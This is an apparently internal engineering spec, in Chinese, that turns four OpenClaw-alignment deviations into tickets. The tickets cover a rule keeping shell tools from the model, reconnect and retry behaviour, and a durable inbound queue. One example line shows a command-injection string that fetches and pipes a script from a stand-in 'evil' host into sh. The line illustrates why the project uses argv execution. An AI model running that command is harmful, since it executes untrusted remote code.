# OpenClaw 对齐：batch B 那四处"故意不同"

## 这份 spec 是什么

2026-11-07 的全量票面评审（`docs/reviews/2026-11-07-m0-m8-openclaw-alignment.md`）里，
batch B 有四处被记成**故意不同**——"和 OpenClaw 不一样，但我们写了理由"：

| 票 | 差异 |
| --- | --- |
| m2-02 | MCP 启动即 fail-fast vs 后台退避重试 |
| m2-08 | argv 直执 vs shell 解释 |
| m2-closeout-04 | 进程内 TTL 去重 vs 持久队列 |
| m2-closeout-05 | 连不上即启动失败 vs 降级 |

按 `AGENTS.md` 的口径重判过一轮之后，"故意不同"这一档不再装东西：

> 和它不一样就是偏差（不一致）；它没有这个东西就是自研——那要用例子说清，
> 不能反过来拿"我们有理由"当结论。

于是这四条里，三条是**真偏差**（02 / closeout-04 / closeout-05），一条是**形态选择成立但机器闸有洞**（08）。
这份 spec 把它们拆成四张票，`issues/01`–`04`，按代价从低到高排。

## 为什么 08 没被并进那三条

08 的结论是"我们的脚本包收 argv，不收命令字符串"，这是**形态选择**，理由与例子在票面里
（`east; curl http://evil/x.sh | sh` 走 shell 是两条命令，走 argv 是一个参数）。
它不需要改行为。它有问题的只有一处：**那条红线今天没有机器证据**——
"通用 shell 工具在 classpath 上但没装给模型"这句话只存在于注释里，注册一个 `@Bean ShellTools`
不会被任何一道闸拦住。所以票 `01` 只补规则，不动产品行为。

## 四张票与顺序

| 票 | 内容 | 代价 | 判据来源 |
| --- | --- | --- | --- |
| `01-shell-tools-arch-rule` | 通用 shell 能力不得装给模型（ArchUnit 规则） | 小 | `docs/tools/exec.md:54-55` |
| `02-channel-recoverable-reconnect` | 通道：可恢复失败走后台重连，永久错误仍失败 | 小偏中 | `docs/channels/slack/transports.md:71` |
| `03-mcp-background-retry` | MCP：连不上后台退避重试，工具清单按轮解析 | 中偏大 | `docs/tools/mcp.md:44-45,61` |
| `04-inbound-durable-queue` | 入站：先落库再 ACK，重启续跑，同对话串行 | 大 | `docs/channels/feishu/setup.md:43,45` |

顺序不是"由易到难"凑出来的，是**依赖决定的**：

- `01` 先做，因为它守的是一条**已经成立**的红线。现在做只花一条规则；等哪天有人真把 `Bash` 装上，
  再补规则就得先决定"要不要撤掉它"——那时"补闸"和"改产品"会纠缠在一起。
- `02` 与 `03` 都要一件事：**把不可测的建连过程抽成可注入的端口**。`02` 的规模小得多，
  它是这件事的最小样本：飞书通道今天直接 `new Client.Builder(...)`，默认构建里既没有凭据也没有网络，
  于是"重连"根本写不出用例。先在通道上把"端口 + 可控调度器 + 状态"这套形状跑通，
  `03` 再照着做，比在 MCP 那一层边设计边试便宜。
- `04` 最后，因为它要动数据库（新 schema + 迁移 + 真库用例），还会改掉 `accept` 的语义。
  前三张都不碰库，先做完它们，`04` 的红只可能出在它自己身上。

## 共同的判据口径

- **反例必须先跑红**。四张票的验收都写了两类：正例（该绿的绿）+ 反例（把实现改坏这条必须红）。
  没有跑过反例等于没有验证。
- **证据落到方法名**，不只写 Comments。
- **门禁**：`./scripts/verify.sh` 全绿、跳过 0、行覆盖率 ≥60%；每模块 ≤10 个测试文件、
  单文件 ≤20 个 `@Test`。**五个模块现在都正好 10 个文件**，所以四张票都不能新开测试文件，
  只能塞进未满的既有文件或先合并腾槽。这条每张票都单独写了落点。
- **对齐的是机制，不是措辞**。理由三段（它那条机制是什么 → 我们差在哪 → 只能改成什么、代价是什么）
  缺第三段的不算理由，算另发明一套。

## 不做

- **不改 ADR 正文**。`03` 要动 ADR-0002 的"启动期硬失败"，做法是加修订记录（那篇已有先例），
  不是重写当年那段推理。
- **不把 OpenClaw 的通用 `exec` 搬过来**。`01` 守的是"不装给模型"；要不要真的提供一个通用 shell 工具
  是另一件事，得单开票，不能拿"补了一条规定"当已经想过。
- **不引 Redis / 不引消息队列**。`04` 用库里的一张表，理由写在票面（我们只有一个进程要活过重启，
  不是要一个跨进程总线）。
- **不接 CI、不用假模型**。这两条已经裁决过，四张票都按"本地手动跑 `./mvnw clean verify`"写。
